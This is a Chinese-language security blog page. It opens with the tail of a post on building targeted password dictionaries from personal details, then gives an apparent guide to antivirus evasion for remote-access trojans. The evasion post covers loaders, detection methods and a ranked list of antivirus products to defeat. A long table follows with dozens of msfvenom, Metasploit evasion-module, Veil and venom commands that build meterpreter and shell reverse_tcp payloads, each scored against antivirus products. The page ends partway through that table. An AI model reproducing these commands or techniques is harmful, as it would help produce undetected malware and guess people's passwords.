<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;人&quot;:&#123;</span><br><span class="line">        &quot;拼音全称1&quot;:&quot;chuanjianguo&quot;,</span><br><span class="line">		&quot;拼音全称2&quot;:&quot;ChuanJianguo&quot;,</span><br><span class="line">		&quot;拼音简写1&quot;:&quot;CJg&quot;,</span><br><span class="line">		&quot;拼音简写2&quot;:&quot;cjg&quot;,</span><br><span class="line">		&quot;拼音全称3&quot;:&quot;jianguo&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;生日&quot;:&#123;</span><br><span class="line">        &quot;生日全部1&quot;:&quot;20210512&quot;,</span><br><span class="line">		&quot;生日部分&quot;:&quot;0512&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;电话&quot;: &#123;</span><br><span class="line">	    &quot;手机号后6位&quot;:&quot;123456&quot;,</span><br><span class="line">		&quot;手机号后4位&quot;:&quot;3456&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;学校&quot;:&#123;</span><br><span class="line">	    &quot;学号&quot;:&quot;123456&quot;,</span><br><span class="line">		&quot;毕业或入学年份&quot;:&quot;2021&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;sfz&quot;:&#123;</span><br><span class="line">		&quot;sfz后6位&quot;:&quot;654321&quot;,</span><br><span class="line">		&quot;sfz后4位&quot;:&quot;4321&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;爱好/宠物&quot;:&#123;</span><br><span class="line">		&quot;关键字&quot;:&quot;xiuer&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;公司&quot;:&#123;</span><br><span class="line">		&quot;name1&quot;:&quot;Google&quot;,</span><br><span class="line">		&quot;name2&quot;:&quot;GG&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;其他&quot;:&#123;</span><br><span class="line">	    &quot;通用词缀&quot;:&quot;略&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="9-2-口令哈希逆向查询"><a href="#9-2-口令哈希逆向查询" class="headerlink" title="9.2 口令哈希逆向查询"></a>9.2 口令哈希逆向查询</h4><p>在线密文密码查询网站，有时能帮助我们得到明文密码。</p>
<p><a target="_blank" rel="noopener" href="https://cmd5.com/">https://cmd5.com/</a></p>
<h4 id="9-3-图片搜索"><a href="#9-3-图片搜索" class="headerlink" title="9.3 图片搜索"></a>9.3 图片搜索</h4><p><strong>百度识图</strong>：<a target="_blank" rel="noopener" href="https://image.baidu.com/?fr=shitu">https://image.baidu.com/?fr=shitu</a></p>
<p><strong>谷歌识图</strong>：<a target="_blank" rel="noopener" href="https://images.google.com/">https://images.google.com/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%8D%E6%9D%80%E5%AE%9E%E6%88%98%E7%A0%94%E7%A9%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/21/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%8D%E6%9D%80%E5%AE%9E%E6%88%98%E7%A0%94%E7%A9%B6/" class="post-title-link" itemprop="url">免杀-二进制免杀入门</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-06-21 20:12:00 / Modified: 23:08:40" itemprop="dateCreated datePublished" datetime="2021-06-21T20:12:00-08:00">2021-06-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="二进制免杀入门"><a href="#二进制免杀入门" class="headerlink" title="二进制免杀入门"></a>二进制免杀入门</h2><h3 id="1-免杀制作视角"><a href="#1-免杀制作视角" class="headerlink" title="1 免杀制作视角"></a>1 免杀制作视角</h3><h4 id="1-1-免杀目标"><a href="#1-1-免杀目标" class="headerlink" title="1.1 免杀目标"></a>1.1 免杀目标</h4><p>任何可用于攻击或破坏的实体都需要免杀，且免杀与查杀是动态对抗的。实际上，程序的实际形态与结构比较复杂，因此不同形态类型的程序使用的免杀技术是存在一定区别的。</p>
<h4 id="1-2-流行免杀工具"><a href="#1-2-流行免杀工具" class="headerlink" title="1.2 流行免杀工具"></a>1.2 流行免杀工具</h4><table>
<thead>
<tr>
<th>名称</th>
<th>国内流行度</th>
<th>专用免杀工具</th>
</tr>
</thead>
<tbody><tr>
<td>msfvenom</td>
<td>非常高</td>
<td>否</td>
</tr>
<tr>
<td>cobalt_strike</td>
<td>非常高</td>
<td>否</td>
</tr>
<tr>
<td>veil</td>
<td>高</td>
<td>是</td>
</tr>
<tr>
<td>msf-vasion</td>
<td>高</td>
<td>是</td>
</tr>
<tr>
<td>venom</td>
<td>高</td>
<td>是</td>
</tr>
<tr>
<td>The Backdoor Factory</td>
<td>一般</td>
<td>是</td>
</tr>
<tr>
<td>thefatrat</td>
<td>一般</td>
<td>是</td>
</tr>
<tr>
<td>zirkatu</td>
<td>低</td>
<td>是</td>
</tr>
<tr>
<td>avlator</td>
<td>低</td>
<td>是</td>
</tr>
<tr>
<td>nps_payload</td>
<td>低</td>
<td>是</td>
</tr>
<tr>
<td>donout</td>
<td>低</td>
<td>是</td>
</tr>
</tbody></table>
<h4 id="1-3-对象形态"><a href="#1-3-对象形态" class="headerlink" title="1.3 对象形态"></a>1.3 对象形态</h4><h5 id="1-3-1-独立文件"><a href="#1-3-1-独立文件" class="headerlink" title="1.3.1 独立文件"></a>1.3.1 独立文件</h5><p>以远控为例，独立的远控指程序自身就是完全独立可用的远控程序，内部实现了完备的功能。远控中有时提到的stagless/single类远控也就是独立远控。</p>
<p>典型工具：<strong>Metasploit</strong>、<strong>ColbaltStrike</strong>。<strong>灰鸽子</strong>、<strong>冰河</strong>、<strong>上兴</strong></p>
<h5 id="1-3-2-加载器"><a href="#1-3-2-加载器" class="headerlink" title="1.3.2 加载器"></a>1.3.2 加载器</h5><p>以远控为例，以msf/cs工具的漏洞利用过程来说，目标设备上运行加载器(stager)，加载器从C2服务器上再动态加载（payload-staging）完整的功能模块(stage)。</p>
<p>典型工具：<strong>Metasploit</strong>、<strong>ColbaltStrike</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stager：是一段很精短的代码，本质是个加载器，它可以向C2服务器发起连接，并下载真正的payload并将其注入内存。(bind_tcp/reverse_tcp)</span><br><span class="line"></span><br><span class="line">stage：是一个包含了很多功能的代码块，用于接受和执行我们控制端的任务并返回结果。(meterpreter/shell)</span><br><span class="line"></span><br><span class="line">payload Staging：stager通过各种方式(如http、dns、tcp等)下载stage并注入内存运行这个过程。</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/231002</span><br><span class="line">https://my.oschina.net/u/4581876/blog/4380681</span><br><span class="line">所谓的beacon与stage(r)类似，是远控在受害者的驻点。</span><br></pre></td></tr></table></figure>



<h5 id="1-3-3-文件篡改"><a href="#1-3-3-文件篡改" class="headerlink" title="1.3.3 文件篡改"></a>1.3.3 文件篡改</h5><p>不少程序内部存在大量的空闲空间，这些空间闲散在各个节区内，某些研究人员发现可以在这些空余间隙中填充payload并篡改程序的执行流程，从而达到植入后门的目的。</p>
<p>典型工具：<strong>The Backdoor Factory</strong></p>
<h5 id="1-3-4-dll注入-劫持"><a href="#1-3-4-dll注入-劫持" class="headerlink" title="1.3.4 dll注入/劫持"></a>1.3.4 dll注入/劫持</h5><p>通过劫持正常的程序对依赖的dll的加载，从而劫持程序的执行流程达到执行恶意代码恶意功能的目的。</p>
<p>典型工具：<strong>Metasploit</strong>、<strong>ColbaltStrike</strong>、<strong>venom</strong>、<strong>APT白加黑</strong></p>
<h5 id="1-3-5-无文件执行"><a href="#1-3-5-无文件执行" class="headerlink" title="1.3.5 无文件执行"></a>1.3.5 无文件执行</h5><p>以powershell和bashshell为代表，通过命令动态向C2服务器请求代码并执行或反弹一个shell。</p>
<p>典型工具：<strong>Empire</strong>、<strong>Nishang</strong></p>
<h3 id="2-杀软检测视角"><a href="#2-杀软检测视角" class="headerlink" title="2 杀软检测视角"></a>2 杀软检测视角</h3><h4 id="2-1-恶意文件检测技术"><a href="#2-1-恶意文件检测技术" class="headerlink" title="2.1 恶意文件检测技术"></a>2.1 恶意文件检测技术</h4><p>常规的安全软件对恶意程序的识别与查杀主要有以下手段：</p>
<h5 id="2-1-1-特征码扫描技术"><a href="#2-1-1-特征码扫描技术" class="headerlink" title="2.1.1 特征码扫描技术"></a>2.1.1 特征码扫描技术</h5><p>计算文件的特征与数据库内的特征进行比对。误报率低，适用于已知病毒。</p>
<h5 id="2-1-2-校验和扫描技术"><a href="#2-1-2-校验和扫描技术" class="headerlink" title="2.1.2 校验和扫描技术"></a>2.1.2 校验和扫描技术</h5><p>计算文件的哈希校验和与数据库内进行比对。误报率低，适用于已知病毒，但很容易被绕过。</p>
<h5 id="2-1-3-虚拟行为分析"><a href="#2-1-3-虚拟行为分析" class="headerlink" title="2.1.3 虚拟行为分析"></a>2.1.3 虚拟行为分析</h5><p>通过将文件放置到杀毒软件创建的虚拟环境中进行运行，观察其对资源的申请动作，进而识别程序是否恶意。</p>
<h5 id="2-1-4-启发式引擎查杀"><a href="#2-1-4-启发式引擎查杀" class="headerlink" title="2.1.4 启发式引擎查杀"></a>2.1.4 启发式引擎查杀</h5><p>在提取并获得程序的静态特征及行为的基础上，结合学习经验，推断出目标是否是恶意文件。</p>
<h5 id="2-1-5-主动防御"><a href="#2-1-5-主动防御" class="headerlink" title="2.1.5 主动防御"></a>2.1.5 主动防御</h5><p>主动防御分为两大块。</p>
<p>- <strong>行为监控</strong>：通过hook 系统底层API，进而识别进程对资源的申请动作。</p>
<p>- <strong>内存查杀</strong>：分析内存中程序的结构。</p>
<h5 id="2-1-6-云查杀"><a href="#2-1-6-云查杀" class="headerlink" title="2.1.6 云查杀"></a>2.1.6 云查杀</h5><p>主要是解决本地杀毒软件无法存储所有恶意文件的静态特征的问题，将本地文件的特征值计算出来与云端进行比对。</p>
<h5 id="2-1-7-多引擎查杀"><a href="#2-1-7-多引擎查杀" class="headerlink" title="2.1.7 多引擎查杀"></a>2.1.7 多引擎查杀</h5><p>结合多家杀毒软件的引擎对文件进行查杀，进而降低误报率。</p>
<h5 id="2-1-8-人工智能引擎"><a href="#2-1-8-人工智能引擎" class="headerlink" title="2.1.8 人工智能引擎"></a>2.1.8 人工智能引擎</h5><p>通过人工智能分析的算法，结合海量数据，从而学习新形式恶意软件查杀的能力。</p>
<h4 id="2-2-杀毒软件"><a href="#2-2-杀毒软件" class="headerlink" title="2.2 杀毒软件"></a>2.2 杀毒软件</h4><p>由于要做的免杀主要用于国内，因此与国内杀软的对抗，处于最高的优先级。结合国内杀软的普及占有率，大概给出以下梯队结构：</p>
<p><strong>优先级1：</strong>360全家桶、Windows Defender、火绒、奇安信</p>
<p><strong>优先级2：</strong>瑞星、诺顿、金山、小红伞、腾讯安全管家</p>
<p><strong>优先级3：</strong>江民、比特梵德、迈克菲、大蜘蛛、avast等。</p>
<h3 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3 免杀技术"></a>3 免杀技术</h3><p>这里以最为常见的独立远控与加载类远控为例，介绍免杀一个文件的几个大的步骤。</p>
<h4 id="3-1-第一阶段-文件免杀-静态免杀"><a href="#3-1-第一阶段-文件免杀-静态免杀" class="headerlink" title="3.1 第一阶段-文件免杀/静态免杀"></a>3.1 第一阶段-文件免杀/静态免杀</h4><p>文件免杀是免杀的第一阶段，杀毒软件最常见的对恶意样本的识别就是检测文件特征码。文件免杀即是规避掉这些特征，规避方法有很多，下面给出几种常见的免杀方式。</p>
<ul>
<li>1.<strong>特征码定位修改免杀</strong>：破坏特征，影响模糊哈希结果。（比较适合无源码情况下免杀，不同厂商特征码确定方法不一，故免杀代价高）</li>
<li>2.<strong>加壳免杀</strong>：核心程序外套一层加密壳，壳有自己的程序入口，运行后解密出核心程序并执行。壳掩盖了内部可能存在的特征值，但壳自己也有特征，且有可能被查杀软件与分析人员脱掉。（TideSec的文章中提到可以修改冷门壳的程序实现绕过。）</li>
<li>3.<strong>花指令免杀</strong>：填充垃圾数据或无意义指令阻止反汇编分析或影响特征码定位。</li>
<li>4.<strong>shellcode的混淆/分离</strong>：以msf、cs为代表漏洞利用框架，stager中常用的shellcode已被杀毒软件重点关照，因此可以将他们进行混淆处理，在运行时进行重组。</li>
<li>5.<strong>分离免杀</strong>：以msf、cs为代表漏洞利用框架，stager中常用的shellcode已被杀毒软件重点关照。可以将payload-staging时的shellcode与程序shellcode加载器进行分离。加载器+加密或编码后的payload，进而躲掉模糊哈希比对。</li>
</ul>
<h4 id="3-2-第二阶段-反行为检测-运行时免杀1"><a href="#3-2-第二阶段-反行为检测-运行时免杀1" class="headerlink" title="3.2 第二阶段-反行为检测/运行时免杀1"></a>3.2 第二阶段-反行为检测/运行时免杀1</h4><ul>
<li><p>欺骗沙箱</p>
</li>
<li><p>识别并躲避沙箱</p>
</li>
</ul>
<p>主要是规避掉文件运行时会表现出来的行为特征（如联网、读写敏感文件、获取敏感资源）。</p>
<p>在对抗行为检测的过程中，又会引入一部分静态特征，因此需要不断的综合调整。下面引用一篇文章中对行为检测对抗的简要介绍。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/Airboi/bypass-av-note</span><br><span class="line">对行为来讲，很多API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控（如下图所示，使用ZwAllocateVirtualMemory函数替代VirtualAlloc）。</span><br></pre></td></tr></table></figure>



<h4 id="3-3-第三阶段-内存免杀-运行时免杀2"><a href="#3-3-第三阶段-内存免杀-运行时免杀2" class="headerlink" title="3.3 第三阶段 内存免杀/运行时免杀2"></a>3.3 第三阶段 内存免杀/运行时免杀2</h4><p>杀毒软件沙箱中扫描运行起来的恶意程序，扫描起内存地址上的内容是否能匹配到已知的病毒库特征值。</p>
<p>从目前的实际工具免杀来看，往往只要过了文件免杀与行为检测免杀就能实现彻底免杀。然而不少杀毒软件还有内存查杀，内存查杀针对已知的恶意文件查杀效果较好。想要躲避内存查杀，需要破坏程序加载到内存后的特征，因此往往需要结合源码进行修改。</p>
<h4 id="3-4-其他-非常规免杀"><a href="#3-4-其他-非常规免杀" class="headerlink" title="3.4 其他-非常规免杀"></a>3.4 其他-非常规免杀</h4><ul>
<li>1 <strong>白名单免杀</strong>：杀毒软件有白名单，白化可以从以下角度考虑（图片、版本信息、对话框）、泄露的可信的私钥签名</li>
<li>2 <strong>dll劫持免杀</strong>：优先级劫持或替换正常位置的dll达到白加黑绕过。</li>
<li>3 <strong>篡改免杀</strong>：以BDF为代表的后门制作工具利用正常程序中的无用空间填充shellcode，篡改正常执行流程达到后门制作的效果。</li>
<li>4 <strong>切换开发语言</strong>：杀毒软件对不同语言开发出来的远控识别能力是存在差异的，主流的漏洞利用框架下，基于C/C++、C#、py、powershell的样本识别率往往很高，而go语言的识别率就较低。</li>
</ul>
<h2 id="0x01-免杀测试"><a href="#0x01-免杀测试" class="headerlink" title="0x01 免杀测试"></a>0x01 免杀测试</h2><p>针对一些主流的常见的漏洞利用框架及免杀制作工具，简单进行了测试。结果如下。</p>
<table>
<thead>
<tr>
<th>工具</th>
<th></th>
<th>生成</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>360杀毒联网</td>
<td>360卫士联网</td>
<td>腾讯安全（联网）</td>
<td>火绒</td>
<td></td>
<td></td>
</tr>
<tr>
<td>msfvenom</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51001 -f exe -o  51001.exe</td>
</tr>
<tr>
<td>msfconsole</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>msfconsole -x “use  windows/windows_defender_exe;\set filename 51002.exe;\set payload  windows/meterpreter/reverse_tcp;\set LHOST 192.168.43.128;\set LPORT  51002;\run;\exit”</td>
</tr>
<tr>
<td>msfconsole</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>msfconsole -x “use  windows/windows_defender_js_hta;\set filename 51003.hta;\set payload  windows/meterpreter/reverse_tcp;\set LHOST 192.168.43.128;\set LPORT  51003;\run;\exit”</td>
</tr>
<tr>
<td>veil</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use autoit/shellcode_inject/flat.py     generate     Ordnance     use 4     set LHOST 192.168.43.128     set LPORT 51004     generate     51004          exit</td>
</tr>
<tr>
<td>veil</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use c/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51005     generate     51005          exit</td>
</tr>
<tr>
<td>veil</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51006     generate     51006          exit</td>
</tr>
<tr>
<td>veil</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/shellcode_inject/base64.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51007     generate     51007          exit</td>
</tr>
<tr>
<td>veil</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51008     generate     51008          exit</td>
</tr>
<tr>
<td>veil</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use go/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51009     generate     51009          exit</td>
</tr>
<tr>
<td>veil</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use go/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51010     generate     51010          exit</td>
</tr>
<tr>
<td>veil</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use powershell/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51011     generate     51011          exit</td>
</tr>
<tr>
<td>veil</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use powershell/shellcode_inject/psexec_virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51012     generate     51012          exit</td>
</tr>
<tr>
<td>veil</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use powershell/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51013     generate     51013          exit</td>
</tr>
<tr>
<td>msfvenom</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51014 -f exe -i 5  -e x86/shikata_ga_nai -o 51014.exe</td>
</tr>
<tr>
<td>msfvenom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51015 -f exe -i 5  -e x86/shikata_ga_nai |msfvenom -a x86 –platform windows -e x86/countdown -i  8 -f raw -o 51015.exe</td>
</tr>
<tr>
<td>msfvenom</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51016 -f exe -i 10  -b “\x00” -e x86/shikata_ga_nai -o 51016.exe</td>
</tr>
<tr>
<td>veil</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use autoit/shellcode_inject/flat.py     generate     Ordnance     use 4     set LHOST 192.168.43.128     set LPORT 51017     set Encoder xor     generate     51017          exit</td>
</tr>
<tr>
<td>veil</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use go/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51018     set encoder xor     generate     51018          exit</td>
</tr>
<tr>
<td>veil</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51019     set encoder xor     generate     51019          exit</td>
</tr>
<tr>
<td>msfconsole</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>msfconsole -x “use  windows/applocker_evasion_install_util;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51020;\set filename 51020.txt;\run;\exit”</td>
</tr>
<tr>
<td>msfconsole</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>msfconsole -x “use  evasion/windows/applocker_evasion_workflow_compiler;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51021;\set XML_FILE 51021.xml;\set XOML_FILE 51021.xoml;\run;\exit”</td>
</tr>
<tr>
<td>msfconsole</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>msfconsole -x “use  evasion/windows/applocker_evasion_msbuild;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51022;\set filename 51022.txt;\run;\exit”</td>
</tr>
<tr>
<td>msfconsole</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>msfconsole -x “use  evasion/windows/applocker_evasion_presentationhost;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51023;\set CSPROJ_FILE 51023.csproj;\set CS_FILE 51023.xaml.cs;\set  MANIFEST_FILE 51023.manifest;\run;\exit”</td>
</tr>
<tr>
<td>msfconsole</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>msfconsole -x “use  evasion/windows/applocker_evasion_regasm_regsvcs;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51024;\set SNK_FILE 51024.snk;\set TXT_FILE 51024.txt;\run;\exit”</td>
</tr>
<tr>
<td>msfvenom</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51025 -f exe -x  csc-v4.0.30319x86.exe -o 51025.exe</td>
</tr>
<tr>
<td>msfvenom</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51026 -f exe -x  csc-v4.0.30319x86.exe -i 10 -b “\x00” -e x86/shikata_ga_nai -o  51026.exe</td>
</tr>
<tr>
<td>msfconsole</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>msfconsole -x “use  evasion/windows/process_herpaderping;\set payload  windows/meterpreter/reverse_tcp;\set lhost 192.168.43.128;\set lport  51027;\set filename 51027.exe;\run;\exit”</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>2     4     192.168.43.128     51028     windows/meterpreter/reverse_tcp     51028     None-Obfuscation</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>2     4     192.168.43.128     51029     windows/meterpreter/reverse_tcp     51029     String Obfuscation（3 s）</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>2     4     192.168.43.128     51030     windows/shell/reverse_tcp     51030     None-Obfuscation</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>√</td>
<td>2     4     192.168.43.128     51031     windows/shell/reverse_tcp     51031     String Obfuscation（3 s）</td>
</tr>
<tr>
<td>venom</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>2     5     192.168.43.128     51032     windows/meterpreter/reverse_tcp     51032</td>
</tr>
<tr>
<td>venom</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>2     5     192.168.43.128     51033     windows/shell/reverse_tcp     51033</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>2     3     192.168.43.128     51034     windows/shell/reverse_tcp     51034     default(shellcode.py)python</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>2     3     192.168.43.128     51035     windows/shell/reverse_tcp     51035     pyherion(shellcode.py)obfuscated</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>2     3     192.168.43.128     51036     windows/shell/reverse_tcp     51036     NXcrypt(shellcode.py)obfuscated</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>2     3     192.168.43.128     51037     windows/shell/reverse_tcp     51037     pyinstaller(shellcode.exe)executable</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>2     3     192.168.43.128     51038     windows/meterpreter/reverse_tcp     51038     default(shellcode.py)python</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>2     3     192.168.43.128     51039     windows/meterpreter/reverse_tcp     51039     pyherion(shellcode.py)obfuscated</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>2     3     192.168.43.128     51040     windows/meterpreter/reverse_tcp     51040     NXcrypt(shellcode.py)obfuscated</td>
</tr>
<tr>
<td>venom</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>2     3     192.168.43.128     51041     windows/meterpreter/reverse_tcp     51041     pyinstaller(shellcode.exe)executable</td>
</tr>
<tr>
<td>venom</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>2     15     192.168.43.128     51042     windows/meterpreter/reverse_tcp     51042</td>
</tr>
<tr>
<td>venom</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>2     15     192.168.43.128     51043     windows/shell/reverse_tcp     51043</td>
</tr>
<tr>
<td>venom</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>2     16     192.168.43.128     51044     windows/meterpreter/reverse_https     51044</td>
</tr>
<tr>
<td>venom</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
